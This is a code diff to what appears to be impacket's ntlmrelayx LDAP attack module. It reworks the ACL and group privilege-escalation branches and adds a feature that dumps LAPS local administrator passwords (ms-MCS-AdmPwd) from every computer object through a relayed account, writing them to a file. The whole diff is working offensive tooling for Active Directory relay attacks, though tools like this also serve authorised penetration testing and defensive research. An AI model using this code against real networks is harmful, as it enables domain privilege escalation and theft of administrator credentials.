@@ -27,6 +27,7 @@ import ldap3
 import ldapdomaindump
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.utils.conv import escape_filter_chars
+import os
 
 from impacket import LOG
 from impacket.examples.ldap_shell import LdapShell
@@ -546,21 +547,19 @@ class LDAPAttack(ProtocolAttack):
                 result = self.getUserInfo(domainDumper, self.config.escalateuser)
                 # Unless that account does not exist of course
                 if not result:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
-                userDn, userSid = result
-                # Perform the ACL attack
-                self.aclAttack(userDn, domainDumper)
-                return
+                    LOG.error('Unable to escalate without a valid user.')
+                else:
+                    userDn, userSid = result
+                    # Perform the ACL attack
+                    self.aclAttack(userDn, domainDumper)
             elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
+                    LOG.error('Unable to escalate without a valid user.')
                 # Perform the ACL attack
-                self.aclAttack(userDn, domainDumper)
-                return
+                else:
+                    self.aclAttack(userDn, domainDumper)
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                     'privileges. Specify a user to assign privileges to with --escalate-user')
@@ -573,24 +572,63 @@ class LDAPAttack(ProtocolAttack):
                 result = self.getUserInfo(domainDumper, self.config.escalateuser)
                 # Unless that account does not exist of course
                 if not result:
-                    LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
-                userDn, userSid = result
+                    LOG.error('Unable to escalate without a valid user.')
                 # Perform the Group attack
-                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
-                return
+                else:
+                    userDn, userSid = result
+                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
+
             elif privs['create']:
                 # Create a nice shiny new user for the escalation
                 userDn = self.addUser(privs['createIn'], domainDumper)
                 if not userDn:
                     LOG.error('Unable to escalate without a valid user, aborting.')
-                    return
                 # Perform the Group attack
-                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
-                return
+                else:
+                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
+
             else:
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                           'privileges. Specify a user to assign privileges to with --escalate-user')
+
+        # Dump LAPS Passwords
+        if self.config.dumplaps:
+            LOG.info("Attempting to dump LAPS passwords")
+
+            success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])
+            
+            if success:
+
+                fd = None
+                filename = "laps-dump-" + self.username + "-" + str(random.randint(0, 99999))
+                count = 0
+
+                for entry in self.client.response:
+                    try:
+                        dn = "DN:" + entry['attributes']['distinguishedname']
+                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
+
+                        if fd is None:
+                            fd = open(filename, "a+")
+
+                        count += 1
+
+                        LOG.debug(dn)
+                        LOG.debug(passwd)
+
+                        fd.write(dn)
+                        fd.write("\n")
+                        fd.write(passwd)
+                        fd.write("\n")
+
+                    except:
+                        continue
+
+                if fd is None:
+                    LOG.info("The relayed user %s does not have permissions to read any LAPS passwords" % self.username)
+                else:
+                    LOG.info("Successfully dumped %d LAPS passwords through relayed account %s" % (count, self.username))
+                    fd.close()
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
